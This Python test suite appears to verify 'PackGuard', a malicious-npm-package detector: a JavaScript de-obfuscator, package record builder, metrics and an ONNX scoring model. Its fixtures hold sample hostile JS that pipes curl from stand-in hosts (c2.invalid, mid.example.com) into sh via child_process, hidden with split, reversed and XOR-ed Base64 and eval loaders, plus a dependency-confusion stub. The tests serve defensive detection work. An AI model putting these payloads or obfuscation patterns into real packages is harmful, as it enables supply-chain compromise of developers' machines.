r"""
PackGuard Stage 2 v7 — Comprehensive Local CPU Verification Suite.

Verifies every component of `stage 2 LLM Model/v7/` locally on CPU without requiring GPU/PyTorch:
  1. Syntax & AST compile check across all Python modules in `v7/`.
  2. Static AST De-obfuscator (`ast_deobfuscator.py`):
     - Multi-variable split Base64 > 80 chars (`split_payload`)
     - `_0x` string-array lookup + double-Base64 (`encoded_loader` / `obfuscated_loader`)
     - Reversed Base64 `.split('').reverse().join('')` (`eval_decode`)
     - Constant-key XOR & Caesar numeric array `.map(x => String.fromCharCode(x ^ k))` (`eval_decode`)
     - URI decoding (`decodeURIComponent`), `\xNN` / `\uNNNN` escapes, template literals `${a}${b}`
     - Speed check (< 2 ms per file) and zero false decoding on ordinary English/benign code.
  3. Record & Window Builder (`record_builder.py`):
     - Extensionless CLI script (`#!/usr/bin/env node`) detection (`chunks > 0`)
     - `T2_rename` non-standard extension entrypoint via `package.json["main"]` (`chunks > 0`)
     - Metadata-only `99.99.99` dependency-confusion fallback (`// [PACKAGE_META]`, strictly name-neutral!)
     - `T1_format` giant block-comment + indentation compaction & interior hotspot window selection
     - Scoped package name canonicalization (`@scope/pkg`, `@scope__pkg`, `@scope_pkg`, `@scope@pkg@1.0`)
  4. Metrics & MIL Aggregator (`metrics_v7.py`):
     - Exact rank-based ROC-AUC with ties, specificity calibration, and NumPy MIL forward pass.
  5. Dual-Output Dynamic ONNX Graph (`binary_logits [B,2]`, `tactic_logits [B,8]`):
     - Builds a real opset-17 dual-output dynamic ONNX model via `onnx.helper`, verifies
       length-bucketed dynamic batching order preservation (exact 1:1 parity across shuffled lengths),
       tactic attribution, and `filter_reports_directory` Stage 1 report integration.
"""

import ast
import base64
import json
import py_compile
import sys
import tempfile
import time
from pathlib import Path

V7_DIR = Path(__file__).resolve().parent
if str(V7_DIR) not in sys.path:
    sys.path.insert(0, str(V7_DIR))

import numpy as np
import onnx
from onnx import TensorProto, helper

from ast_deobfuscator import static_ast_deobfuscate
from metrics_v7 import (
    calibrate_threshold_for_specificity,
    compute_roc_auc,
    extract_package_mil_features,
    score_package_with_mil_weights,
)
from record_builder import (
    build_package_windows_with_meta,
    normalize_package_name,
    package_dir_to_record,
)
from stage2_filter import PackGuardStage2Model, filter_reports_directory


def test_syntax_all_v7_files() -> None:
    py_files = sorted(V7_DIR.glob("*.py"))
    assert len(py_files) >= 8, f"Expected >= 8 Python files in {V7_DIR}, found {len(py_files)}"
    for pf in py_files:
        src = pf.read_text(encoding="utf-8")
        ast.parse(src, filename=str(pf))
        py_compile.compile(str(pf), doraise=True)
    print(f"[PASS] 1/5 Syntax & bytecode compilation verified across {len(py_files)} v7 Python modules.")


def test_static_ast_deobfuscator() -> None:
    secret_js = "const cp = require('child_process'); cp.execSync('curl -s https://c2.invalid/run | sh');"
    b64 = base64.b64encode(secret_js.encode()).decode()

    # Case A: Multi-variable split Base64 > 110 chars (failed in v6 due to 80-char regex cap!)
    code_split = (
        f"const a0 = '{b64[:40]}';\n"
        f"const a1 = '{b64[40:85]}';\n"
        f"const a2 = '{b64[85:]}';\n"
        f"const combined = a0 + a1 + a2;\n"
        f"eval(Buffer.from(combined, 'base64').toString('utf8'));\n"
    )
    out_a = static_ast_deobfuscate(code_split)
    assert "child_process" in out_a and "https://c2.invalid/run" in out_a, f"Split b64 failed: {out_a}"

    # Case B: `_0x` string array lookup + double Base64
    b64_2 = base64.b64encode(b64.encode()).decode()
    code_tbl = (
        f"const _0xabc = ['base64', 'utf8', '{b64_2}'];\n"
        f"const step1 = Buffer.from(_0xabc[0x2], _0xabc[0]).toString(_0xabc[1]);\n"
        f"eval(Buffer.from(step1, _0xabc[0]).toString());\n"
    )
    out_b = static_ast_deobfuscate(code_tbl)
    assert "child_process" in out_b, f"_0x double-b64 failed: {out_b}"

    # Case C: Reversed Base64
    code_rev = f"const r = '{b64[::-1]}';\neval(Buffer.from(r.split('').reverse().join(''), 'base64').toString());\n"
    out_c = static_ast_deobfuscate(code_rev)
    assert "child_process" in out_c, f"Reversed b64 failed: {out_c}"

    # Case D: Constant-key XOR charCode map (including parenthesized arrow `(v) =>`)
    xor_arr = ",".join(str(b ^ 0x2A) for b in secret_js.encode())
    code_xor = f"const d = [{xor_arr}];\nconst s = d.map((v) => String.fromCharCode(v ^ 0x2a)).join('');\neval(s);\n"
    out_d = static_ast_deobfuscate(code_xor)
    assert "child_process" in out_d, f"XOR map failed: {out_d}"

    # Case E: Template literal interpolation + URI decode
    uri = "".join(f"%{b:02x}" for b in b"require('https').get('https://uri.example.com/x')")
    code_uri = f"const u = '{uri}';\neval(decodeURIComponent(u));\nconst h = 'https://', d = 'tmpl.example.com/z';\nfetch(`${{h}}${{d}}`);\n"
    out_e = static_ast_deobfuscate(code_uri)
    assert "https://uri.example.com/x" in out_e and "https://tmpl.example.com/z" in out_e, f"URI/template failed: {out_e}"

    # Case F: Clean benign file + 50 KB single-quoted array ReDoS stress test (< 60 ms!) + false-b64 URL path guard
    benign_js = (
        "const route = '/api/v1/users/getProfileDetailsNow';\n"
        "function add(a, b) { return a + b; }\nmodule.exports = { add, route };\n"
    ) * 15
    t0 = time.perf_counter()
    out_f = static_ast_deobfuscate(benign_js)
    dt_ms = (time.perf_counter() - t0) * 1000.0
    assert out_f == "", f"Unexpected decoded output on plain benign JS: {out_f}"

    redos_probe = "const arr = [" + ",".join(f"'item_{k}'" for k in range(350)) + ", 0];\n"
    t_redos = time.perf_counter()
    _ = static_ast_deobfuscate(redos_probe)
    redos_ms = (time.perf_counter() - t_redos) * 1000.0
    assert redos_ms < 100.0, f"ReDoS regression on single-quoted array: {redos_ms:.2f} ms"

    # Case G: Anti-shortcut check — zero `.invalid` domains in `prepare_v7_dataset.py` or `lora_patch_v7.py`
    for gen_name in ("prepare_v7_dataset.py", "lora_patch_v7.py"):
        gen_src = (V7_DIR / gen_name).read_text(encoding="utf-8")
        assert ".invalid" not in gen_src, f"Found `.invalid` benchmark shortcut in {gen_name}!"

    print(f"[PASS] 2/5 Static AST De-obfuscator resolved all families ({dt_ms:.2f} ms benign, {redos_ms:.2f} ms 350-elem ReDoS guard).")


def test_record_builder_blindspots_and_leakage() -> None:
    with tempfile.TemporaryDirectory(prefix="pg-v7-test-") as tmp:
        root = Path(tmp)

        # 1. Extensionless `bin/cli` with node shebang + renamed entrypoint `lib/core.raw`
        pkg1 = root / "secret-pkg-name@1.0.0"
        (pkg1 / "bin").mkdir(parents=True)
        (pkg1 / "lib").mkdir(parents=True)
        (pkg1 / "package.json").write_text(
            json.dumps({"name": "@secret-scope/secret-pkg-name", "version": "1.0.0", "main": "./lib/core.raw", "bin": {"cli": "./bin/cli"}}),
            encoding="utf-8",
        )
        (pkg1 / "bin/cli").write_text("#!/usr/bin/env node\nrequire('../lib/core.raw');\n", encoding="utf-8")
        (pkg1 / "lib/core.raw").write_text("const https = require('https');\nmodule.exports = 1;\n", encoding="utf-8")

        rec1 = package_dir_to_record(pkg1)
        assert len(rec1["chunks"]) == 2, f"Expected 2 code chunks for shebang+entrypoint, got {len(rec1['chunks'])}"

        # 2. Metadata-only `99.99.99` dependency-confusion shell -> must NOT be `chunks: 0` AND must NOT leak package name!
        pkg2 = root / "@corp-internal__auth@99.99.99"
        pkg2.mkdir(parents=True)
        (pkg2 / "package.json").write_text(
            json.dumps({"name": "@corp-internal/auth", "version": "99.99.99", "description": "internal"}),
            encoding="utf-8",
        )
        rec2 = package_dir_to_record(pkg2)
        wins2, _ = build_package_windows_with_meta(rec2)
        assert len(wins2) == 1 and "high_major_99+" in wins2[0], f"Expected meta fallback window, got {wins2}"
        assert "corp-internal" not in wins2[0], f"Package name leaked into window text: {wins2[0]}"

        # 3. T1 giant comment bloat + `"~/.ssh/*"` string literal before comment + interior hotspot selection
        filler_comment = "/* " + ("license filler text " * 250) + " */\n"
        glob_str_guard = 'const sshGlob = "~/.ssh/*";\nconst mustSurvive = "PAYLOAD_SURVIVED_COMMENT_TRIM";\n'
        harmless_pad = "const x = 1;\n" * 350
        interior_payload = "const cp = require('child_process'); cp.exec('curl https://mid.example.com/sh | sh');\n"
        big_file = glob_str_guard + filler_comment + harmless_pad + interior_payload + harmless_pad
        wins3, _ = build_package_windows_with_meta(
            {"package": "padded-pkg", "chunks": [{"file": "index.js", "kind": "js", "start": 0, "text": big_file}]},
            max_windows=4,
        )
        assert any("PAYLOAD_SURVIVED_COMMENT_TRIM" in w for w in wins3), "`/*` inside string literal deleted code!"
        assert any("https://mid.example.com/sh" in w for w in wins3), "Interior security-density hotspot window missed payload!"

        # 4. Scoped package name normalization parity
        forms = [
            "@0xobelisk/sui-cli@1.2.0",
            "@0xobelisk__sui-cli@1.2.0",
            "@0xobelisk_sui-cli@1.2.0",
            "@0xobelisk@sui-cli@1.2.0",
        ]
        norms = {normalize_package_name(f) for f in forms}
        assert norms == {"@0xobelisk/sui-cli"}, f"Scoped normalization mismatch: {norms}"

    print("[PASS] 3/5 Record builder verified: extensionless shebangs, renamed entrypoints, name-neutral 99.99.99 meta, T1/T3 hotspot, scoped dedup.")


def test_metrics_and_mil() -> None:
    y_true = np.array([0, 0, 0, 0, 1, 1, 1, 1], dtype=np.int64)
    y_score = np.array([0.01, 0.05, 0.10, 0.20, 0.80, 0.90, 0.95, 0.99], dtype=np.float64)
    assert abs(compute_roc_auc(y_true, y_score) - 1.0) < 1e-9
    cal = calibrate_threshold_for_specificity(y_true, y_score, target_specificity=0.95)
    assert cal["recall"] == 1.0 and cal["benign_specificity"] == 1.0

    # 24-feature MIL vector, source-vs-sink capabilities, centered logit calibration & backward-compat 10-feature test
    dummy_logits = np.array([[3.0, -3.0], [2.5, -2.5], [-1.5, 1.8]], dtype=np.float32)
    dummy_tactics = np.array([[4.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [3.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0], [0.2, 0.1, 0.1, 0.5, 1.5, 0.1, 0.1, 0.1]], dtype=np.float32)
    dummy_meta = [{"is_install": False}, {"is_install": False}, {"is_install": False}]
    benign_src_only_wins = ["const os = require('os'); exports.ips = () => os.networkInterfaces();"]
    feat = extract_package_mil_features(dummy_logits, dummy_meta, tac_logits=dummy_tactics, windows=benign_src_only_wins)
    assert feat.shape == (25,) and np.isfinite(feat).all(), f"Expected 25-dim finite MIL vector, got {feat.shape}"
    assert feat[16] == 1.0 and feat[20] == 0.0 and feat[21] == 0.0, f"Unexpected source-only capability flags: {feat[16:]}"

    http_only_wins = ["const axios = require('axios'); exports.get = (u) => axios.get(u);"]
    feat_http = extract_package_mil_features(dummy_logits, dummy_meta, tac_logits=dummy_tactics, windows=http_only_wins)
    assert feat_http[19] == 1.0 and feat_http[20] == 0.0, f"Unexpected http-only capability flags: {feat_http[16:]}"

    mil_cfg_25 = {
        "enabled": True,
        "logit_bias": 0.5,
        "logit_temperature": 1.15,
        "feat_mean": [0.0] * 25,
        "feat_scale": [1.0] * 25,
        "w1": [[0.1] * 25 for _ in range(4)],
        "b1": [0.0] * 4,
        "w2": [[0.5, -0.2, 0.3, 0.1]],
        "b2": [0.0],
    }
    p_mil = score_package_with_mil_weights(dummy_logits, dummy_meta, mil_cfg_25, tac_logits=dummy_tactics, windows=benign_src_only_wins)
    assert 0.0 < p_mil < 1.0

    # Legacy 10-feature backward compatibility check
    mil_cfg_10 = {
        "enabled": True,
        "feat_mean": [0.0] * 10,
        "feat_scale": [1.0] * 10,
        "w1": [[0.1] * 10 for _ in range(4)],
        "b1": [0.0] * 4,
        "w2": [[0.5, -0.2, 0.3, 0.1]],
        "b2": [0.0],
    }
    p_mil_legacy = score_package_with_mil_weights(dummy_logits, dummy_meta, mil_cfg_10)
    assert 0.0 < p_mil_legacy < 1.0
    print("[PASS] 4/5 Pure-NumPy ROC-AUC, threshold calibration & 25-feat MIL package aggregator verified.")


def _build_synthetic_dual_output_onnx(onnx_path: Path) -> None:
    """Builds a valid opset-17 dynamic-shape dual-output ONNX model (`binary_logits`, `tactic_logits`)."""
    inp_ids = helper.make_tensor_value_info("input_ids", TensorProto.INT64, ["batch_size", "seq_len"])
    inp_msk = helper.make_tensor_value_info("attention_mask", TensorProto.INT64, ["batch_size", "seq_len"])
    out_bin = helper.make_tensor_value_info("binary_logits", TensorProto.FLOAT, ["batch_size", 2])
    out_tac = helper.make_tensor_value_info("tactic_logits", TensorProto.FLOAT, ["batch_size", 8])

    # Lightweight deterministic graph over dynamic [B, L]:
    # Cast(input_ids * attention_mask -> float) -> ReduceMean(axis=1, keepdims=1) -> MatMul([1,2] & [1,8])
    w_bin = helper.make_tensor("W_bin", TensorProto.FLOAT, [1, 2], [-0.001, 0.001])
    w_tac = helper.make_tensor("W_tac", TensorProto.FLOAT, [1, 8], [0.0, 0.1, 0.3, 0.2, 0.05, 0.05, 0.05, 0.05])
    axes_t = helper.make_tensor("axes_1", TensorProto.INT64, [1], [1])

    nodes = [
        helper.make_node("Mul", ["input_ids", "attention_mask"], ["masked_ids"]),
        helper.make_node("Cast", ["masked_ids"], ["ids_f"], to=TensorProto.FLOAT),
        helper.make_node("Cast", ["attention_mask"], ["msk_f"], to=TensorProto.FLOAT),
        helper.make_node("ReduceSum", ["ids_f", "axes_1"], ["sum_ids"], keepdims=1),
        helper.make_node("ReduceSum", ["msk_f", "axes_1"], ["sum_msk"], keepdims=1),
        helper.make_node("Div", ["sum_ids", "sum_msk"], ["pooled"]),
        helper.make_node("MatMul", ["pooled", "W_bin"], ["binary_logits"]),
        helper.make_node("MatMul", ["pooled", "W_tac"], ["tactic_logits"]),
    ]
    graph = helper.make_graph(
        nodes,
        "PackGuardSyntheticDualV7",
        [inp_ids, inp_msk],
        [out_bin, out_tac],
        initializer=[w_bin, w_tac, axes_t],
    )
    # Use opset 13 ReduceMean attribute compatibility + IR version 8 for wide ORT support
    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 13)])
    model.ir_version = 8
    onnx.save(model, str(onnx_path))


def test_dual_output_onnx_and_bucketed_batching() -> None:
    tok_src = V7_DIR.parent / "v6" / "model_int8" / "tokenizer.json"
    assert tok_src.is_file(), f"Missing real ModernBERT tokenizer at {tok_src}"

    with tempfile.TemporaryDirectory(prefix="pg-v7-ort-") as tmp:
        mdir = Path(tmp)
        (mdir / "tokenizer.json").write_bytes(tok_src.read_bytes())
        _build_synthetic_dual_output_onnx(mdir / "packguard_v7_int8.onnx")
        (mdir / "best_threshold.json").write_text(json.dumps({"threshold": 0.50}), encoding="utf-8")

        model = PackGuardStage2Model(model_dir=mdir, threads=2)
        assert model.has_tactic_head, "Expected dual-output tactic head detection!"

        # Verify length-bucketed batching returns EXACT same per-window logits regardless of batch order!
        diverse_texts = [
            "short()",
            "const a = require('https');\n" * 60,
            "x = 1;",
            "function medium(k) { return Buffer.from(k, 'base64').toString('utf8'); }\n" * 12,
            "tiny",
        ]
        batch_logits, batch_tactics = model._score_windows_logits_batch(diverse_texts, batch_size=2, include_tactics=True)
        assert batch_logits.shape == (5, 2) and batch_tactics is not None and batch_tactics.shape == (5, 8)
        for idx, txt in enumerate(diverse_texts):
            single_logit, single_tac = model._score_windows_logits_batch([txt], batch_size=1, include_tactics=True)
            assert np.allclose(batch_logits[idx], single_logit[0], atol=1e-5), f"Bucketed order mismatch at {idx}!"
            assert np.allclose(batch_tactics[idx], single_tac[0], atol=1e-5), f"Tactic order mismatch at {idx}!"

        # Verify Stage 1 report filtering + explainable fields
        rep_dir = mdir / "reports"
        rep_dir.mkdir()
        (rep_dir / "pkg_a.json").write_text(
            json.dumps({"package": "pkg_a", "flagged": True, "score": 0.30, "chunks": [{"file": "index.js", "kind": "js", "text": diverse_texts[1]}]}),
            encoding="utf-8",
        )
        summary = filter_reports_directory(model, rep_dir, stage1_fusion=True)
        assert summary["total_reports"] == 1 and summary["scored"] == 1

    print("[PASS] 5/5 Dual-output ONNX (`binary_logits` + `tactic_logits`), length-bucketed batch parity & Stage 1 fusion verified.")


if __name__ == "__main__":
    test_syntax_all_v7_files()
    test_static_ast_deobfuscator()
    test_record_builder_blindspots_and_leakage()
    test_metrics_and_mil()
    test_dual_output_onnx_and_bucketed_batching()
    print("\n=== ALL PACKGUARD STAGE 2 v7 LOCAL CPU TESTS PASSED (5/5) ===")
